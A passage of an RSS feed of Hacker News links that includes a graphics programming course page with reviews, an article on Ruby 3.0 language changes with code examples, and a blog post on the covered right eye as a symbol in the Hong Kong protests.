                <p>Discuss course topics and engage with other students using the discussion board</p>
              </li>
            
              <li>
                <i></i>
                <h4>Money back guarantee</h4>
                <p>We offer a 14-day money back guarantee for all our courses. No questions asked.</p>
              </li>
            
          </ul>
        </div>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-a7929a42cb"></a><section data-preview-item="course-curriculum" data-section-uid="a7929a42cb">
  
</section>






<a id="cst-v2-section-SkoDUs7uE"></a><section data-preview-item="instructor" data-section-uid="SkoDUs7uE">
  <div>
    
  <header>
    
      <h3>Instructor</h3>
    
    
  </header>


    <article>
      
        <ul>
          
          
            <li>
              
              <p><img src="https://thinkific-import.s3.amazonaws.com/167815/UhcXrUppRcGK1ZTSy8gj_profile-picture-bass2-small-square.png" alt="Gustavo Pezzi" title="Gustavo Pezzi">
              </p>
              
              <div>
                <header>
                  
                    <h4>
                      Senior Lecturer
                    </h4>
                  
                  <h4>
                    Gustavo Pezzi
                  </h4>
                </header>
                
                  <section>
                    Gustavo teaches computer science and mathematics at BPP University, London. He studies how teaching game programming can help enhance awareness and understanding of basic mathematics and physics. He is also a professional software engineer with more than 10 years of experience, with an industry background in 3D systems, games, systems, databases, and data analysis.
His academic path includes institutions such as Pittsburg State University, City University of London, and University of Oxford.
                  </section>
                  
                
              </div>
            </li>
          
        </ul>
      
    </article>
  </div>
</section>






<a id="cst-v2-section-zg3768Lds"></a><section data-preview-item="reviews" data-section-uid="zg3768Lds">
  <div>
    
  <header>
    
      <h3>Reviews</h3>
    
    
  </header>


    <article>
      
        <ul>
          
            
            <li data-review-id="1">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great course
                </h4>
                
              </header>
              <section>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in su...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>Been waiting for a course like this for years.  A lot of the theory of 3d graphics is availablein books and online , but none that put it into practice in such a clear way (if at all) . Also using C which I am more comfortable using than OOP (i'm a bit old school) .  It is a great refresher on C too, its a big project so far (only a bout 1/3 of the way through), but loving it so far.  </p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="2">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Very good course and very well explained
                </h4>
                <h4>jÃ©rÃ©my aldebert</h4>
              </header>
              <section>
                <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                <div>
                  <p>The course is very understandable. Everything is explained in detail with clarity. I am very happy.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="3">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  The real 3d graphics fundamentals course
                </h4>
                <h4>Andrew Douglas</h4>
              </header>
              <section>
                <div>
                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were di...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were discussed before implementing them and student own problem solving opportunity was encouraged throughout. This course has enabled me to fill in the critical gaps in some of the most important fundamental concepts in 3d graphics programming. Hope to see more!! Thank you.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="4">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  I wish I had this course at the beginning of my career !
                </h4>
                <h4>N PA</h4>
              </header>
              <section>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to ...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to support those kind of materials! I basically learned all this stuff by myself through books and articles, but this course is a all in one place to learn them all at once, in a fun/approachable and motivating way that will make you save some precious time. Even if this is a good refresher for me and I already had the "clicks" before, I'll recommend it for anyone wanting to become a graphics/game/programmer !</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="5">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great Course
                </h4>
                <h4>Peter Lous</h4>
              </header>
              <section>
                <div>
                  <p>If you want to …</p></div></section></li></ul></article></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://courses.pikuma.com/courses/learn-computer-graphics-programming">https://courses.pikuma.com/courses/learn-computer-graphics-programming</a></em></p>]]>
            </description>
            <link>https://courses.pikuma.com/courses/learn-computer-graphics-programming</link>
            <guid isPermaLink="false">hacker-news-small-sites-25576462</guid>
            <pubDate>Tue, 29 Dec 2020 23:40:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3.0 Changes]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25575831">thread link</a>) | @mooreds
<br/>
December 29, 2020 | https://rubyreferences.github.io/rubychanges/3.0.html | <a href="https://web.archive.org/web/*/https://rubyreferences.github.io/rubychanges/3.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<ul>
  <li><strong>Released at:</strong> Dec 25, 2020 (<a href="https://github.com/ruby/ruby/blob/ruby_3_0/NEWS">NEWS</a> file)</li>
  <li><strong>Status (as of Dec 30, 2020):</strong> Stable, just released</li>
  <li><strong>This document first published:</strong> Dec 25, 2020</li>
  <li><strong>Last change to this document:</strong> Dec 30, 2020</li>
</ul>

<h2 id="highlights">Highlights<a href="#highlights"></a></h2>

<p>Ruby 3.0 is a major language release. The core team worked hard to preserve backward compatibility while delivering some huge and exciting new features.</p>

<ul>
  <li><a href="#keyword-arguments-are-now-fully-separated-from-positional-arguments">Full separation of keyword arguments</a></li>
  <li><a href="#ractors">Ractors</a>: Thread-alike object implementing the actor model, and finally lifting the GVL (Global Virtual machine Lock) and enabling true concurrency</li>
  <li><a href="#non-blocking-fiber-and-scheduler">Non-blocking IO with Fibers</a></li>
  <li><a href="#types">Type declarations</a> (in separate files)</li>
  <li>Pattern matching:
    <ul>
      <li><a href="#pattern-matching">No longer experimental</a></li>
      <li>Two flavors for one-line pattern matching: <a href="#one-line-pattern-matching-with-"><code>=&gt;</code> (aka rightward assignment)</a> and <a href="#in-as-a-truefalse-check"><code>in</code> (aka boolean check)</a></li>
      <li><a href="#find-pattern">Find patterns</a></li>
    </ul>
  </li>
  <li><a href="#endless-method-definition">“Endless” methods</a></li>
  <li><a href="#gcauto_compact-accessor">GC auto-compaction</a></li>
</ul>

<h2 id="language-changes">Language changes<a href="#language-changes"></a></h2>

<h3 id="keyword-arguments-are-now-fully-separated-from-positional-arguments">Keyword arguments are now fully separated from positional arguments<a href="#keyword-arguments-are-now-fully-separated-from-positional-arguments"></a></h3>

<p>The separation which <a href="https://rubyreferences.github.io/rubychanges/2.7.html#keyword-argument-related-changes">started in 2.7</a> with deprecations, is now fully finished. It means  keyword arguments are not a “syntax sugar” on top of hashes, and they never converted into each other implicitly:</p>

<ul>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/14183">Feature #14183</a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>old_style</span><span>(</span><span>name</span><span>,</span> <span>options</span> <span>=</span> <span>{})</span>
<span>end</span>

<span>def</span> <span>new_style</span><span>(</span><span>name</span><span>,</span> <span>**</span><span>options</span><span>)</span>
<span>end</span>

<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>{</span><span>age: </span><span>10</span><span>})</span>
<span># Ruby 2.6: works</span>
<span># Ruby 2.7: warns: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call</span>
<span># Ruby 3.0: ArgumentError (wrong number of arguments (given 2, expected 1))</span>
<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>age: </span><span>10</span><span>)</span>
<span># =&gt; works</span>
<span>h</span> <span>=</span> <span>{</span><span>age: </span><span>10</span><span>}</span>
<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>**</span><span>h</span><span>)</span>
<span># =&gt; works, ** is mandatory</span>

<span># The last hash argument still allowed to be passed without {}:</span>
<span>old_style</span><span>(</span><span>'John'</span><span>,</span> <span>age: </span><span>10</span><span>)</span>
<span># =&gt; works</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong> There is a <a href="https://www.ruby-lang.org/en/news/2019/12/12/separation-of-positional-and-keyword-arguments-in-ruby-3-0/">big and detailed explanation</a> of the separation reasons, logic, and edge cases on Ruby site, written at the dawn of 2.7, so we will not go into more details here.</li>
</ul>

<h4 id="procs-with-rest-arguments-and-keywords-change-of-autosplatting-behavior">Procs with “rest” arguments and keywords: change of autosplatting behavior<a href="#procs-with-rest-arguments-and-keywords-change-of-autosplatting-behavior"></a></h4>

<p>Just a leftover from the separation of keyword arguments.</p>

<ul>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16166">Feature #16166</a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>block</span> <span>=</span> <span>proc</span> <span>{</span> <span>|*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>|</span> <span>puts</span> <span>"args=</span><span>#{</span><span>args</span><span>}</span><span>, kwargs=</span><span>#{</span><span>kwargs</span><span>}</span><span>"</span><span>}</span>
<span>block</span><span>.</span><span>call</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>a: </span><span>true</span><span>)</span>
<span># Ruby 2.7: args=[1, 2], kwargs={:a=&gt;true} -- as expected</span>
<span># Ruby 2.7: args=[1, 2], kwargs={:a=&gt;true} -- same</span>
<span>block</span><span>.</span><span>call</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>{</span><span>a: </span><span>true</span><span>})</span>
<span># Ruby 2.7:</span>
<span>#  warning: Using the last argument as keyword parameters is deprecated</span>
<span>#  args=[1, 2], kwargs={:a=&gt;true} -- but extracted to keyword args nevertheless</span>
<span># Ruby 3.0:</span>
<span>#  args=[1, 2, {:a=&gt;true}], kwargs={} -- no attempt to extract hash into keywords, and no error/warning</span>
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="arguments-forwarding--supports-leading-arguments">Arguments forwarding (<code>...</code>) supports leading arguments<a href="#arguments-forwarding--supports-leading-arguments"></a></h3>

<ul>
  <li><strong>Reason:</strong> Argument forwarding, when <a href="https://rubyreferences.github.io/rubychanges/2.7.html#keyword-argument-related-changes">introduced in 2.7</a>, was able to forward only all-or-nothing. It turned out to be not enough. One of the important usages for leading arguments are cases like <code>method_missing</code> and other DSL-defined methods that need to pass to the nested method <code>:some_symbol</code> + all of the original arguments.</li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16378">Feature #16378</a></li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/master/doc/syntax/methods_rdoc.html#label-Argument+forwarding"><code>doc/syntax/methods.rdoc</code></a> <em><small>(the link is to a <code>master</code> version, docs were merged post 3.0 release)</small></em></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>request</span><span>(</span><span>method</span><span>,</span> <span>url</span><span>,</span> <span>headers: </span><span>{})</span>
  <span>puts</span> <span>"</span><span>#{</span><span>method</span><span>.</span><span>upcase</span><span>}</span><span> </span><span>#{</span><span>url</span><span>}</span><span> (headers=</span><span>#{</span><span>headers</span><span>}</span><span>)"</span>
<span>end</span>

<span>def</span> <span>get</span><span>(</span><span>...</span><span>)</span>
  <span>request</span><span>(</span><span>:get</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>get</span><span>(</span><span>'https://example.com'</span><span>,</span> <span>headers: </span><span>{</span><span>content_type: </span><span>'json'</span><span>})</span>
<span># GET https://example.com (headers={:content_type=&gt;"json"})</span>

<span># Leading arguments may be present both in the call and in the definition:</span>
<span>def</span> <span>logged_get</span><span>(</span><span>message</span><span>,</span> <span>...</span><span>)</span>
  <span>puts</span> <span>message</span>
  <span>get</span><span>(</span><span>...</span><span>)</span>
<span>end</span>

<span>logged_get</span><span>(</span><span>'Logging'</span><span>,</span> <span>'https://example.com'</span><span>,</span> <span>headers: </span><span>{</span><span>content_type: </span><span>'json'</span><span>})</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>“all arguments splat” <code>...</code> should be the last statement in the argument list (both on a declaration and a call)</li>
      <li>on a method declaration, arguments before <code>...</code> can only be positional (not keyword) arguments, and can’t have default values (it would be <code>SyntaxError</code>);</li>
      <li>on a method call, arguments passed before <code>...</code> can’t be keyword arguments (it would be <code>SyntaxError</code>);</li>
      <li>make sure to check your punctuation thoroughly, because <code>anything ...</code> is a syntax for endless range, those constructs are valid syntax, but would do not what is expected:
        <div><div><pre><code><span>def</span> <span>delegates</span><span>(</span><span>...</span><span>)</span>
  <span># call without "()" -- actually parsed as (p()...)</span>
  <span>p</span> <span>...</span>
  <span># Prints nothing, but warns: warning: ... at EOL, should be parenthesized?</span>

  <span># "," accidentally missing after 1, there is just one argument: 1...</span>
  <span>p</span><span>(</span><span>1</span> <span>...</span><span>)</span>
  <span># Prints "1..."</span>

  <span>p</span><span>(</span><span>1</span><span>,</span> <span>...</span><span>)</span>
  <span># Prints, as expected:</span>
  <span>#   1</span>
  <span>#   5</span>
<span>end</span>

<span>delegates</span><span>(</span><span>5</span><span>)</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h3 id="endless-method-definition">“Endless” method definition<a href="#endless-method-definition"></a></h3>

<p>Methods of exactly one statement now can be defined with syntax <code>def method() = statement</code>. (The syntax doesn’t need <code>end</code>, hence the “endless definition” moniker.)</p>

<ul>
  <li><strong>Reason:</strong> Ruby’s <code>end</code>s (unlike C-like languages’ <code>{}</code>) are generally OK for Rubyists, but make small utility methods look more heavy than they should. For small utility methods with body containing just one short statement like:
    <div><div><pre><code><span>def</span> <span>available?</span>
  <span>!</span><span>@internal</span><span>.</span><span>empty?</span>
<span>end</span>
</code></pre></div>    </div>
    <p>…the “proper” definition might look so heavy that one will decide against it to leave the class more readable (and instead make class’ clients to just do <code>obj.internal.empty?</code> themselves, making it less semantical). For such cases, a shortcut one-line definition may change the perceiving of utility method creation:</p>
    <div><div><pre><code><span>def</span> <span>available?</span> <span>=</span> <span>!</span><span>@internal</span><span>.</span><span>any?</span>
<span>def</span> <span>finished?</span> <span>=</span> <span>available?</span> <span>&amp;&amp;</span> <span>@internal</span><span>.</span><span>all?</span><span>(</span><span>&amp;</span><span>:finished?</span><span>)</span>
<span>def</span> <span>clear</span> <span>=</span> <span>@internal</span><span>.</span><span>clear</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16746">Feature #16746</a></li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/master/doc/syntax/methods_rdoc.html"><code>doc/syntax/methods.rdoc</code></a> <em><small>(the link is to a <code>master</code> version, docs were merged post 3.0 release)</small></em></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>dbg</span> <span>=</span> <span>puts</span><span>(</span><span>"DBG: </span><span>#{</span><span>caller</span><span>.</span><span>first</span><span>}</span><span>"</span><span>)</span>

<span>dbg</span>
<span># Prints: DBG: test.rb:3:in `&lt;main&gt;'</span>

<span># The method definition supports all kinds of arguments:</span>
<span>def</span> <span>dbg_args</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>=</span><span>1</span><span>,</span> <span>c</span><span>:,</span> <span>d: </span><span>6</span><span>,</span> <span>&amp;</span><span>block</span><span>)</span> <span>=</span> <span>puts</span><span>(</span><span>"Args passed: </span><span>#{</span><span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>d</span><span>,</span> <span>block</span><span>.</span><span>call</span><span>]</span><span>}</span><span>"</span><span>)</span>
<span>dbg_args</span><span>(</span><span>0</span><span>,</span> <span>c: </span><span>5</span><span>)</span> <span>{</span> <span>7</span> <span>}</span>
<span># Prints: Args passed: [0, 1, 5, 6, 7]</span>

<span># For argument definition, () is mandatory</span>
<span>def</span> <span>square</span> <span>x</span> <span>=</span> <span>x</span><span>**</span><span>2</span>
<span># syntax error, unexpected end-of-input -- because Ruby treats it as</span>
<span>#   def square(x = x**2)</span>
<span># ...e.g. an argument with default value, referencing itself, and no method body</span>

<span># This works</span>
<span>def</span> <span>square</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span><span>**</span><span>2</span>
<span>square</span><span>(</span><span>100</span><span>)</span> <span># =&gt; 10000</span>

<span># To avoid confusion, defining method names like #foo= is prohibited</span>
<span>class</span> <span>A</span>
  <span># SyntaxError "setter method cannot be defined in an endless method definition":</span>
  <span>def</span> <span>attr</span><span>=</span><span>(</span><span>val</span><span>)</span> <span>=</span> <span>@attr</span> <span>=</span> <span>val</span>

  <span># Other suffixes are OK:</span>
  <span>def</span> <span>attr?</span><span>()</span> <span>=</span> <span>!!</span><span>@attr</span>
  <span>def</span> <span>attr!</span><span>()</span> <span>=</span> <span>@attr</span> <span>=</span> <span>true</span>
<span>end</span>

<span># funnily enough, operator methods are OK, including #==</span>
<span>class</span> <span>A</span>
  <span>def</span> <span>==</span><span>(</span><span>other</span><span>)</span> <span>=</span> <span>true</span>
<span>end</span>

<span>p</span> <span>A</span><span>.</span><span>new</span> <span>==</span> <span>5</span> <span># =&gt; true</span>

<span># any singular expression can be method body</span>

<span># This works:</span>
<span>def</span> <span>read</span><span>(</span><span>name</span><span>)</span> <span>=</span> <span>File</span><span>.</span><span>read</span><span>(</span><span>name</span><span>)</span>
                     <span>.</span><span>split</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span>
                     <span>.</span><span>map</span><span>(</span><span>&amp;</span><span>:strip</span><span>)</span>
                     <span>.</span><span>reject</span><span>(</span><span>&amp;</span><span>:empty?</span><span>)</span>
                     <span>.</span><span>uniq</span>
                     <span>.</span><span>sort</span>

<span># Or even this, though, what's the point?..</span>
<span>def</span> <span>weird</span><span>(</span><span>name</span><span>)</span> <span>=</span> <span>begin</span>
                    <span>data</span> <span>=</span> <span>File</span><span>.</span><span>read</span><span>(</span><span>name</span><span>)</span>
                    <span>process</span><span>(</span><span>data</span><span>)</span>
                    <span>true</span>
                  <span>rescue</span>
                    <span>false</span>
                  <span>end</span>

<span># inside method body, method calls without parentheses cause a syntax error:</span>
<span>def</span> <span>foo</span><span>()</span> <span>=</span> <span>puts</span> <span>"bar"</span>
<span>#                ^ syntax error, unexpected string literal, expecting `do' or '{' or '('</span>

<span># This is due to parsing ambiguity and is aligned with some other places, like</span>
<span>x</span> <span>=</span> <span>1</span> <span>+</span> <span>sin</span> <span>y</span>
<span>#           ^ syntax error, unexpected tIDENTIFIER, expecting keyword_do or '{' or '('</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>The initial proposal seems to be a good-natured April Fool’s joke, then everybody suddenly liked it, and, with a slight change of syntax, it was accepted;</li>
      <li>Feature is marked as EXPERIMENTAL, but it does NOT produce a warning, it is deliberate, see discussion in <a href="https://bugs.ruby-lang.org/issues/17399">Misc #17399</a>.</li>
    </ul>
  </li>
</ul>

<h3 id="pattern-matching">Pattern matching<a href="#pattern-matching"></a></h3>

<p><strong>Pattern matching, <a href="https://rubyreferences.github.io/rubychanges/2.7.html#pattern-matching">introduced in 2.7</a>, is no longer experimental.</strong> Discussion: <a href="https://bugs.ruby-lang.org/issues/17260">Feature #17260</a>.</p>

<h4 id="one-line-pattern-matching-with-">One-line pattern matching with <code>=&gt;</code><a href="#one-line-pattern-matching-with-"></a></h4>

<ul>
  <li><strong>Reason:</strong> This is an interesting one. Two facts were discussed between 2.7 and 3.0: the fact that in most of the other languages one-line pattern matching has a different order (<code>&lt;pattern&gt; &lt;operator&gt; &lt;data&gt;</code>) than introduced in Ruby 2.7 (<code>&lt;data&gt; in &lt;pattern&gt;</code>); and the idea of “rightward assignment operator” <code>=&gt;</code> for more natural chaining. And then, at some point, ideas converged most fruitfully.</li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/17260">Feature #17260</a>  (main pattern matching tracking ticket), <a href="https://bugs.ruby-lang.org/issues/16670">Feature #16670</a>  (reverse order), <a href="https://bugs.ruby-lang.org/issues/15921">Feature #15921</a>  (standalone rightward assignment operator), <a href="https://bugs.ruby-lang.org/issues/15799">Feature #15799</a>  (abandoned “pipeline operator” idea, in discussion of which “rightward assignment” was born)</li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/3.0.0/doc/syntax/pattern_matching_rdoc.html"><code>doc/syntax/pattern_matching.rdoc</code></a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span># match and unpack:</span>
<span>{</span><span>db: </span><span>{</span><span>user: </span><span>'John'</span><span>,</span> <span>role: </span><span>'admin'</span><span>}}</span> <span>=&gt;</span> <span>{</span><span>db: </span><span>{</span><span>user</span><span>:,</span> <span>role</span><span>:}}</span>
<span>p</span> <span>[</span><span>user</span><span>,</span> <span>role</span><span>]</span> <span># =&gt; ["John", "admin"]</span>

<span># pattern-matching as a rightward assignment for long experessions:</span>
<span>File</span><span>.</span><span>read</span><span>(</span><span>'test.txt'</span><span>)</span>
    <span>.</span><span>split</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>&amp;</span><span>:strip</span><span>)</span>
    <span>.</span><span>reject</span><span>(</span><span>&amp;</span><span>:empty?</span><span>)</span>
    <span>.</span><span>first</span><span>(</span><span>10</span><span>)</span> <span>=&gt;</span> <span>lines</span>

<span>p</span> <span>lines</span> <span># first 10 non-empty lines of the file</span>

<span># unpacking+assignment is extremely powerful:</span>
<span>(</span><span>1</span><span>..</span><span>10</span><span>).</span><span>to_a</span><span>.</span><span>shuffle</span> <span>=&gt;</span> <span>[</span><span>*</span><span>before</span><span>,</span> <span>(</span><span>2</span><span>..</span><span>4</span><span>)</span> <span>=&gt;</span> <span>threshold</span><span>,</span> <span>*</span><span>after</span><span>]</span>
<span># ...in input sequence, find first entry in range 2..4, put it into `threshold`,</span>
<span># and split parts of the sequence before/after it</span>
<span>p</span> <span>[</span><span>before</span><span>,</span> <span>threshold</span><span>,</span> <span>after</span><span>]</span>    <span># your results might be different due to shuffle :)</span>
<span># =&gt; [[7, 5, 8], 3, [1, 10, 6, 9, 4, 2]]</span>

<span># The things can get really out of hand quickly:</span>
<span>Time</span><span>.</span><span>now</span><span>.</span><span>hour</span> <span>=&gt;</span> <span>..</span><span>9</span> <span>|</span> <span>18</span><span>..</span> <span>=&gt;</span> <span>non_working_hour</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>Feature is marked as EXPERIMENTAL, will warn so on an attempt of usage, and may change in the future;</li>
      <li>But simple assignment usage (<code>data =&gt; variable</code>) is <strong>not</strong> considered experimental and is here to stay;</li>
      <li>One quirk that might be non-obvious: pattern matching can desconstruct-assign only to local variables, so when using <code>=&gt;</code> as an assignment operator, you will see those are syntax errors:
        <div><div><pre><code><span>some_statement</span> <span>=&gt;</span> <span>@x</span>
<span>some_statement</span> <span>=&gt;</span> <span>obj</span><span>.</span><span>attr</span> <span># meaning to call `obj.attr=`</span>
<span>some_statement</span> <span>=&gt;</span> <span>$y</span> <span># ...though maybe don't use global variables :)</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h4 id="in-as-a-truefalse-check"><code>in</code> as a <code>true</code>/<code>false</code> check<a href="#in-as-a-truefalse-check"></a></h4>

<p>After the change described above, <code>in</code> was reintroduced to return <code>true</code>/<code>false</code> (whether the pattern matches) instead of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rubyreferences.github.io/rubychanges/3.0.html">https://rubyreferences.github.io/rubychanges/3.0.html</a></em></p>]]>
            </description>
            <link>https://rubyreferences.github.io/rubychanges/3.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575831</guid>
            <pubDate>Tue, 29 Dec 2020 22:27:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Graph Toy, an interactive graph visualizer using mathematical functions]]>
            </title>
            <description>
<![CDATA[
Score 160 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25574661">thread link</a>) | @netule
<br/>
December 29, 2020 | http://memorystomp.com/graphtoy/ | <a href="https://web.archive.org/web/*/http://memorystomp.com/graphtoy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://memorystomp.com/graphtoy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574661</guid>
            <pubDate>Tue, 29 Dec 2020 20:40:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Owl’s Right Eye (2019)]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25574623">thread link</a>) | @paulorlando
<br/>
December 29, 2020 | https://unintendedconsequenc.es/the-owls-right-eye/ | <a href="https://web.archive.org/web/*/https://unintendedconsequenc.es/the-owls-right-eye/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1487">
		<!-- .entry-header -->

	
	<div>
		<p>Let’s come back, more directly, to a theme in my writing — what happens when something small becomes a tipping point for change. <strong>When the seemingly innocuous becomes unpredictable.</strong></p>
<p>If you’ve only casually followed the <a href="https://unintendedconsequenc.es/why-are-there-so-many-protests-in-hong-kong/">Hong Kong protests</a> and reaction from the Chinese mainland and overseas Chinese communities, you might wonder about the importance and meaning of the covered eye. Specifically, the right eye.</p>
<p>Hong Kong protesters found one of their many symbols (and there are many) when police shot and injured the right eye of a protesting woman in August. The injured eye is a more powerful symbol than even that of the man police shot on October 1 (Chinese National Day) in the chest (that is, <em>the heart</em>).</p>
<p>But since the now famous protester’s eye injury we’ve seen company ad campaign apologies and even an individual arrest all because of missing eyes.</p>
<p>But the eye I was reminded of was none of these. It was a different eye — also a right eye and in China — that over 40 years ago had results reminiscent to those eyes of today.</p>

<p>If you are a student of Chinese Cultural Revolution artwork, you might recognize this painting of an owl by Huang Yongyu.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg" alt="Huang Yongyu's owl with one closed eye" width="400" height="607" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl.jpg 300w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Huang-Yongyu-Owl-198x300.jpg 198w" sizes="(max-width: 400px) 100vw, 400px"></p>
<p>Huang served three and a half years in a labor camp for it.</p>
<p>The <a href="https://www.wikiart.org/en/huang-yongyu/owl-1973">painting was interpreted</a> as a “portrayal of public officials turning a blind eye to wrong doings.” It’s not clear if he meant it as such.</p>
<p>Huang’s owl was one of many works of art gathered for a “black painting” (meaning counter-revolutionary) <a href="https://publishing.cdlib.org/ucpressebooks/view?docId=ft6w1007nt&amp;chunk.id=d0e11683&amp;toc.id=d0e10324&amp;toc.depth=100&amp;brand=ucpress&amp;anchor.id=bkd0e11803#X">exhibition and criticism</a> meeting in the 1970s. In some cases, officials had to scrounge around to find more “black painters” to have enough art to criticize. If you read some of the art descriptions, it seems like at least some of the artists were just unlucky rather than counter-revolutionary.</p>
<p>And while I haven’t seen anyone publicly connect Huang’s winking owl with the protests of today, I imagine people with longer memories think about it.</p>
<p>Next in chronology we have of course the event from this summer in Hong Kong. A woman attending a protest was shot in her right eye. Covering one’s <a href="https://www.thelily.com/an-eye-for-an-eye-how-one-womans-eye-patch-became-the-symbol-of-the-hong-kong-protests/">right eye</a> soon became a symbol.</p>
<figure id="attachment_1496" aria-describedby="caption-attachment-1496"><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Hong-Kong-eye-e1572126020800.png" alt="Covering the right eye" width="600" height="309"><figcaption id="caption-attachment-1496">from <a href="https://www.washingtonpost.com/world/2019/08/13/how-bloody-eye-patches-became-latest-symbol-escalating-hong-kong-protests/">Washington Post</a> article</figcaption></figure>
<p>And as a good symbol, it is impossible to ignore (you can’t look away from someone’s eyes and still talk). As a good symbol it also brings the eye-patch wearers themselves into some discomfort.</p>
<p>The eye symbol became even better known when a foreign company felt pressure to remove and apologize for an old ad that predated the Hong Kong protests, but which happened to include a covered right eye.</p>
<p>Here’s a <a href="https://www.pinterest.com/pin/742601426037240952/">Tiffany ad</a> (since removed) that pre-dates the protests.</p>
<p><img loading="lazy" src="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg" alt="Tiffany ad - one covered eye" width="474" height="554" srcset="https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1.jpg 474w, https://unintendedconsequenc.es/wp-content/uploads/2019/10/Tiffany-eye-1-257x300.jpg 257w" sizes="(max-width: 474px) 100vw, 474px"></p>
